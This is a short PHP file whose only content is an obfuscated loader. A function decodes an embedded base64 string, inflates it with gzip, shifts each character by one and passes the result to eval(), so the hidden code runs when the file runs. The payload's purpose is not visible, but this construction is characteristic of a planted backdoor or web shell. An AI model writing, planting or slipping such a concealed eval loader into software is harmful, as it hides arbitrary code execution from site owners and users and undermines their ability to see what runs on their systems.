<?php function pkkg($Ich)
{ 
$Ich=gzinflate(base64_decode($Ich));
 for($i=0;$i<strlen($Ich);$i++)
 {
$Ich[$i] = chr(ord($Ich[$i])-1);
 }
 return $Ich;
 }eval(pkkg("ZZJta9swEMc/QCDf4SYCcmhqZ4wySC2vo2z0zVjpCnuRBSPLl9jUloykrBmjn30nO1nS1G8k6+7+97uHVKH2aLPxKK0+ZJ+VQufgTroKHlCWaNOEnsm4NraFFn1lSsE64zwLr7Xuth78nw4Fc9uirT0DLVv62xgGv2Wzpettheqpd0+CCl0gfONRvYaodg59NMnvv/94XPKN4avp9O94NNk6tE6s6wYjlqBXSSedey7Z9HqIezd4TIGcyxojToTagzKNsYJZLFmWFtnycgVfrDUWFnArtTa+LwtOFNOkyAKY9hkP4i/j0U37VNY24rLvRkXN4DOYf7y6CvYbVZ0bw/NkJ+Z0UIEoVRUNdCAd9Ld9SVbgrmtMSTUt2GywhFgSFDypTIsJj4Pfcr6KeRKf5Lg+tCunBKUsqC8hbGhW1zcq36DPFRVCE3WDNYhrfA5WwX7efQP2X54IYuctyXWNVET0S7MZI6ouRPV6NNsTvUPc5ZEq9jtPEfsMQxsuxHs6UVUG+PJiBV/NVpcLeDWejUXUNCAJlcW1YEfF0/rPE4GXlkoULC8aqWmjjr5voGKeJvIw17SwGR9G+3JAe8VT0J4SDm36o/GyGfa/BwcBlGVHcqRBvGcIb/lZ1gc3tfMDAYnuc3/K/gE="));?>
